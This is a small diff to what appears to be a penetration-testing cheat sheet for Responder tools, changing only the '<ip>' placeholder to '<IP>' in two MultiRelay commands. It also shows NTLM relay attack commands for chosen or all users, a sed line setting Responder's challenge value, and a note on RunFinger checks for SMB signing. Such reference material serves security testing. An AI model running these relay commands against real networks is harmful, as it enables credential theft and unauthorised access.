@@ -62,13 +62,13 @@ sudo sed -i 's/Challenge =.*$/Challenge = 1122334455667788/g' /etc/responder/Res
 ## multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
-multirelay -t <ip> -u <user1> <user2>
+multirelay -t <IP> -u <user1> <user2>
 ```
 
 ## multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
-multirelay -t <ip> -u ALL
+multirelay -t <IP> -u ALL
 ```
 
 ## runfinger - Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.
